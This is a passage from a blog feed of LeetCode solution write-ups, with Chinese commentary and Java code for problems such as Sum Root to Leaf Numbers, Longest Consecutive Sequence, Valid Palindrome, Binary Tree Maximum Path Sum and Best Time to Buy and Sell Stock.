<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3]</span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line">Output: 25</span><br><span class="line">Explanation:</span><br><span class="line">The root-to-leaf path 1-&gt;2 represents the number 12.</span><br><span class="line">The root-to-leaf path 1-&gt;3 represents the number 13.</span><br><span class="line">Therefore, sum = 12 + 13 = 25.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input: [4,9,0,5,1]</span><br><span class="line">    4</span><br><span class="line">   / \</span><br><span class="line">  9   0</span><br><span class="line"> / \</span><br><span class="line">5   1</span><br><span class="line">Output: 1026</span><br><span class="line">Explanation:</span><br><span class="line">The root-to-leaf path 4-&gt;9-&gt;5 represents the number 495.</span><br><span class="line">The root-to-leaf path 4-&gt;9-&gt;1 represents the number 491.</span><br><span class="line">The root-to-leaf path 4-&gt;0 represents the number 40.</span><br><span class="line">Therefore, sum = 495 + 491 + 40 = 1026.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目和LeetCode 113. Path Sum II非常像。在Q113中，给出路径：路径开始于根节点，终止于叶子节点，并且路径的和为给定值。这里要求的是所有路径的和。总体方法其实一样的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> sum;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumNumbers</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    sumNumbersHelper(root, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sumNumbersHelper</span><span class="params">(TreeNode root, String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    String sNew = s + Integer.toString(root.val);</span><br><span class="line">    <span class="comment">// leaf node</span></span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>) &#123;</span><br><span class="line">        sum += Integer.parseInt(sNew);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sumNumbersHelper(root.left, sNew);</span><br><span class="line">    sumNumbersHelper(root.right, sNew);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<C>StringBuilder</C>，并使用backtracking的思想，删除已访问过的数字：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> sum;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumNumbers</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    sumNumbersHelper(root, <span class="keyword">new</span> StringBuilder());</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sumNumbersHelper</span><span class="params">(TreeNode root, StringBuilder s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    s.append(Integer.toString(root.val));</span><br><span class="line">    <span class="comment">// leaf node</span></span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>)</span><br><span class="line">        sum += Integer.parseInt(s.toString());</span><br><span class="line">    sumNumbersHelper(root.left, s);</span><br><span class="line">    sumNumbersHelper(root.right, s);</span><br><span class="line">    s.deleteCharAt(s.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但上面的方法都太笨拙了。因为根本不要保存字符串，直接保存数字，大大节省了内存。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumNumbers</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sumNumbersHelper(root, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">sumNumbersHelper</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    sum = <span class="number">10</span>*sum + root.val;</span><br><span class="line">    <span class="comment">// leaf node</span></span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    <span class="keyword">return</span> sumNumbersHelper(root.left, sum) +</span><br><span class="line">            sumNumbersHelper(root.right, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[128. Longest Consecutive Sequence]]></title>
      <url>/wiki/2017/10/30/Leetcode-128-Longest-Consecutive-Sequence/</url>
      <content type="html"><![CDATA[<p>Given an unsorted array of integers, find the length of the longest consecutive elements sequence.</p>
<p>Your algorithm should run in $O(n)$ complexity.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [100, 4, 200, 1, 3, 2]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: The longest consecutive elements sequence is [1, 2, 3, 4]. </span><br><span class="line">Therefore its length is 4.</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Given an unsorted array of integers,</span></span><br><span class="line"><span class="comment"> * find the length of the longest consecutive elements sequence.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/longest-consecutive-sequence/description/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q128LongestConsecutiveSequence</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; dict = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; count = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            dict.put(num, num);</span><br><span class="line">            count.put(num, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dict.containsKey(num + <span class="number">1</span>))</span><br><span class="line">                union(num,num + <span class="number">1</span>, dict, count);</span><br><span class="line">            <span class="keyword">if</span> (dict.containsKey(num - <span class="number">1</span>))</span><br><span class="line">                union(num, num - <span class="number">1</span>, dict, count);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            max = Math.max(count.get(num), max);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, HashMap&lt;Integer, Integer&gt; dict, HashMap&lt;Integer, Integer&gt; count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rooti = root(i, dict);</span><br><span class="line">        <span class="keyword">int</span> rootj = root(j, dict);</span><br><span class="line">        <span class="keyword">if</span> (rooti != rootj) &#123;</span><br><span class="line">            <span class="keyword">if</span> (count.get(rooti) &lt; count.get(rootj)) &#123;</span><br><span class="line">                dict.replace(rooti, rootj);</span><br><span class="line">                count.replace(rootj, count.get(rooti) + count.get(rootj));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dict.replace(rootj, rooti);</span><br><span class="line">                count.replace(rooti, count.get(rooti) + count.get(rootj));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">root</span><span class="params">(<span class="keyword">int</span> i, HashMap&lt;Integer, Integer&gt; dict)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (i != dict.get(i)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dict.containsKey(dict.get(i)))</span><br><span class="line">                dict.replace(i, dict.get(dict.get(i)));</span><br><span class="line">            i = dict.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Union Find </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[127. Word Ladder]]></title>
      <url>/wiki/2017/10/30/Leetcode-127-Word-Ladder/</url>
      <content type="html"><![CDATA[<p>Given two words (<em>beginWord</em> and <em>endWord</em>), and a dictionary’s word list, find the length of shortest transformation sequence from <em>beginWord</em> to <em>endWord</em>, such that:</p>
<ul>
<li>Only one letter can be changed at a time.</li>
<li>Each transformed word must exist in the word list. Note that <em>beginWord</em> is not a <em>transformed</em> word.</li>
</ul>
<p><strong>Note</strong>:</p>
<ul>
<li>Return 0 if there is no such transformation sequence.</li>
<li>All words have the same length.</li>
<li>All words contain only lowercase alphabetic characters.</li>
<li>You may assume no duplicates in the word list.</li>
<li>You may assume beginWord and endWord are non-empty and are not the same.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">beginWord = &quot;hit&quot;,</span><br><span class="line">endWord = &quot;cog&quot;,</span><br><span class="line">wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]</span><br><span class="line"></span><br><span class="line">Output: 5</span><br><span class="line"></span><br><span class="line">Explanation: As one shortest transformation is &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,</span><br><span class="line">return its length 5.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">beginWord = &quot;hit&quot;</span><br><span class="line">endWord = &quot;cog&quot;</span><br><span class="line">wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]</span><br><span class="line"></span><br><span class="line">Output: 0</span><br><span class="line"></span><br><span class="line">Explanation: The endWord &quot;cog&quot; is not in wordList, therefore no possible transformation.</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Breath-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[125. Valid Palindrome]]></title>
      <url>/wiki/2017/10/30/Leetcode-125-Valid-Palindrome/</url>
      <content type="html"><![CDATA[<p>Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases.</p>
<p>Note: For the purpose of this problem, we define empty string as valid palindrome.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;A man, a plan, a canal: Panama&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;race a car&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>确认字符串是否为有效的回文。这道题目思路还是很简单的。第一步，判断字符是否有效；第二步，比较有效的字符是否左右对称。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// length of the string</span></span><br><span class="line">    <span class="keyword">int</span> n = s.length();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// special occasion</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>[] charArray = s.toLowerCase().toCharArray();</span><br><span class="line">    <span class="keyword">char</span> cur;</span><br><span class="line">    <span class="keyword">int</span> left = -<span class="number">1</span>, right = n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!validAlphanumeric(charArray[++left]))</span><br><span class="line">            <span class="keyword">if</span> (left == n - <span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (!validAlphanumeric(charArray[--right]))&#123;&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (left &gt;= right) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (charArray[left] != charArray[right])</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * check if it is a valid alphanumeric characters</span></span><br><span class="line"><span class="comment"> * return false if not.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validAlphanumeric</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= <span class="string">'a'</span> &amp;&amp; c &lt;= <span class="string">'z'</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">'0'</span> &amp;&amp; c &lt;= <span class="string">'9'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[124. Binary Tree Maximum Path Sum]]></title>
      <url>/wiki/2017/10/30/Leetcode-124-Binary-Tree-Maximum-Path-Sum/</url>
      <content type="html"><![CDATA[<p>Given a <strong>non-empty</strong> binary tree, find the maximum path sum.</p>
<p>For this problem, a path is defined as any sequence of nodes from some starting node to any node in the tree along the parent-child connections. The path must contain <strong>at least one node</strong> and does not need to go through the root.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3]</span><br><span class="line"></span><br><span class="line">       1</span><br><span class="line">      / \</span><br><span class="line">     2   3</span><br><span class="line"></span><br><span class="line">Output: 6</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: [-10,9,20,null,null,15,7]</span><br><span class="line"></span><br><span class="line">   -10</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line"></span><br><span class="line">Output: 42</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目不太容易想到好的解决方法。一种思路是依次求出某节点左子树和右子树的最大路径和，那么以该节点作为根节点的树的最大路径和等于左子树和右子树的最大路径和加上根节点的值。递归求解某颗子树的最大路径和：</p>
<ul>
<li>一个路径从起点到终点，可以往上走几步，然后再往下走几步。但是一旦往下走，它不能再往上走。每个路径有一个最高的节点，也是该路径上的最近共同祖先(LCA, 参考LeetCode 235. Lowest Common Ancestor of a Binary Search Tree)。</li>
<li>一个递归方法<code>maxPathDown(TreeNode node)</code>: <ol>
<li>计算最高节点即node的最大路径和，如果需要更新最大值maxValue；</li>
<li>返回可延伸到输入节点(node)的父节点的最大路径和。</li>
</ol>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> maxValue;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxPathSum</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    maxValue = Integer.MIN_VALUE;</span><br><span class="line">    maxPathDown(root);</span><br><span class="line">    <span class="keyword">return</span> maxValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">maxPathDown</span><span class="params">(TreeNode node)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> left = Math.max(<span class="number">0</span>, maxPathDown(node.left));</span><br><span class="line">    <span class="keyword">int</span> right = Math.max(<span class="number">0</span>, maxPathDown(node.right));</span><br><span class="line">    maxValue = Math.max(maxValue, left + right + node.val);</span><br><span class="line">    <span class="keyword">return</span> Math.max(left, right) + node.val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[121. Best Time to Buy and Sell Stock]]></title>
      <url>/wiki/2017/10/30/Leetcode-121-Best-Time-to-Buy-and-Sell-Stock/</url>
      <content type="html"><![CDATA[<p>Say you have an array for which the $i^{th}$ element is the price of a given stock on day $i$.</p>
<p>If you were only permitted to complete at most one transaction (i.e., buy one and sell one share of the stock), design an algorithm to find the maximum profit.</p>
<p>Note that you cannot sell a stock before you buy one.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [7,1,5,3,6,4]</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5.</span><br><span class="line">             Not 7-1 = 6, as selling price needs to be larger than buying price.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [7,6,4,3,1]</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: In this case, no transaction is done, i.e. max profit = 0.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目考查的是基本的动态规划。可以试着这么想：maxProfits[$i$]代表前$i$天的最大利润，那么怎么知道前$i+1$天的最大利润maxProfits[$i+1$]呢？什么情况下最大利润？就是最低点买入，最高点卖出。既然求前$i+1$天的最大利润，第$i+1$天肯定不能买入，不然没有卖出啊。那么第$i+1$天所做的事情仅有卖出，那么第$i+1$天卖出的股价减去前第$i$天的股票最低点，就有可能是$i+1$天的最大利润。</p>
<p>分析到这里，动态规划的方程非常明显了：</p>
<p>maxProfits[i] = max(maxProfits[i - 1], prices[i - 1] - minPrices[i]);</p>
<p>相应的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] maxProfits = <span class="keyword">new</span> <span class="keyword">int</span>[prices.length + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span>[] minPrices = <span class="keyword">new</span> <span class="keyword">int</span>[prices.length + <span class="number">1</span>];</span><br><span class="line">    maxProfits[<span class="number">0</span>] = <span class="number">0</span>; minPrices[<span class="number">0</span>] = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; maxProfits.length; i++) &#123;</span><br><span class="line">        minPrices[i] = Math.min(minPrices[i - <span class="number">1</span>], prices[i - <span class="number">1</span>]);</span><br><span class="line">        maxProfits[i] = Math.max(maxProfits[i - <span class="number">1</span>], prices[i - <span class="number">1</span>] - minPrices[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxProfits[prices.length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于股票价格是一维的，而且最终只需要截止到最后一天的最大利润，中间结果可以不用保存：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxProfits = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> minPrices = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (prices[i] &lt; minPrices) minPrices = prices[i];</span><br><span class="line">        <span class="keyword">if</span> (prices[i] - minPrices &gt; maxProfits) maxProfits = prices[i] - minPrices;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxProfits;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的算法时间复杂度是$O(n)$，空间复杂度是$O(1)$。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[120. Triangle]]></title>
      <url>/wiki/2017/10/30/Leetcode-120-Triangle/</url>
      <content type="html"><![CDATA[<p>Given a triangle, find the minimum path sum from top to bottom. Each step you may move to adjacent numbers on the row below.</p>
<p>For example, given the following triangle</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">     [2],</span><br><span class="line">    [3,4],</span><br><span class="line">   [6,5,7],</span><br><span class="line">  [4,1,8,3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
